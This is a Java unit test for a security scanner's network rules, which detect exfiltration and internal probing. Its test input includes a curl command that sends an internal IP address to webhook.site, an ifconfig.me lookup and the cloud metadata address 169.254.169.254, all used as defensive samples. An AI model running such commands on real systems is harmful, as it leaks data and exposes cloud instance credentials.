package cn.qx.domain.security.service.scanner;

import cn.qx.domain.security.SecurityTestSupport;
import cn.qx.domain.security.model.valobj.AuditResult;
import cn.qx.domain.security.model.valobj.ScanFinding;
import cn.qx.domain.security.model.valobj.ScanRequest;
import cn.qx.domain.security.model.valobj.SecurityCategory;
import cn.qx.domain.security.model.valobj.SecurityMode;
import cn.qx.domain.security.model.valobj.SecuritySeverity;
import cn.qx.domain.security.service.ISecurityScanner;
import com.alibaba.fastjson2.JSON;
import jakarta.annotation.Resource;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.Set;
import java.util.stream.Collectors;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

/**
 * NetworkScanner 端口测试。
 */
@Slf4j
@RunWith(SpringRunner.class)
@SpringBootTest
public class NetworkScannerTest {

    @Resource
    private ISecurityScanner securityScanner;

    /**
     * 外联、IP 探测、内网与云元数据命中；Benign 地址豁免。
     */
    @Test
    public void exfil_probe_internal_and_metadata_are_classified() {
        String body = """
                curl https://webhook.site/demo?ip=10.0.0.5
                http://ifconfig.me 192.168.1.8 169.254.169.254
                localhost 127.0.0.1 0.0.0.0 metadata.internal
                """;
        AuditResult result = securityScanner.scan(ScanRequest.of(
                body, SecurityTestSupport.networkOnly(SecurityMode.WARN)));
        log.info("网络扫描结果: {}", JSON.toJSONString(result));

        Set<String> rules = result.getFindings().stream()
                .map(ScanFinding::getRuleId).collect(Collectors.toSet());
        assertTrue(rules.contains("network_exfil_target"));
        assertTrue(rules.contains("network_ip_probe"));
        assertTrue(rules.contains("network_internal_probe"));
        assertTrue(result.getFindings().stream()
                .anyMatch(f -> "169.254.169.254".equals(f.getEvidence())
                        && f.getSeverity() == SecuritySeverity.HIGH));
        assertTrue(result.getFindings().stream()
                .filter(f -> f.getCategories() != null)
                .anyMatch(f -> f.getCategories().contains(SecurityCategory.EXFIL)));
        assertFalse("benign localhost 不应命中", result.getFindings().stream()
                .anyMatch(f -> f.getEvidence().contains("localhost")));
    }

    /**
     * 普通公网 URL 不产生 finding。
     */
    @Test
    public void ordinary_public_url_is_not_flagged() {
        AuditResult result = securityScanner.scan(ScanRequest.of(
                "https://api.openai.com/v1/chat/completions",
                SecurityTestSupport.networkOnly(SecurityMode.WARN)));
        log.info("普通公网 URL 结果: {}", JSON.toJSONString(result));
        assertTrue(result.getFindings().isEmpty());
    }
}
